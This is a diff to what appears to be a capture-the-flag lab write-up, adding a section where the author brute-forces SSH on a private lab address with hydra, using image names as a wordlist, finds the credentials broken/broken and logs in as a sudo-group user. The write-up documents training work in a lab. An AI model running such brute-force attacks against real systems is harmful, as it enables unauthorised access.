@@ -72,6 +72,8 @@ there is nothing useful in this picutre, so i tried to enumerate the web directo
 - Bruteforcing with user bob, lead to nothing again
 - Checking all images metadata
 
+## 3.Gaining Shell
+
 i just got frustrated with this CTF, but for the last try i just used image names as user and password and tried to brute force the ssh :
 
 ```text
@@ -92,9 +94,31 @@ mountains
 gallery
 ```
 
+```bash
+root@kali: hydra -L user.txt  -P pass.txt -v 192.168.127.251 ssh -t 5
 
+INFO] Testing if password authentication is supported by ssh://broken@192.168.127.251:22
+[INFO] Successful, password authentication is supported by ssh://192.168.127.251:22
+[22][ssh] host: 192.168.127.251   login: broken   password: broken
+```
 
+now we can ssh to target :
 
+```bash
+root@kali: ssh broken@192.168.127.251
+
+Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+762 packages can be updated.
+458 updates are security updates.
+
+Last login: Sat Jan 27 02:51:54 2024 from 192.168.127.128
+
+broken@ubuntu:~$ id
+uid=1000(broken) gid=1000(broken) groups=1000(broken),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
 
 
 
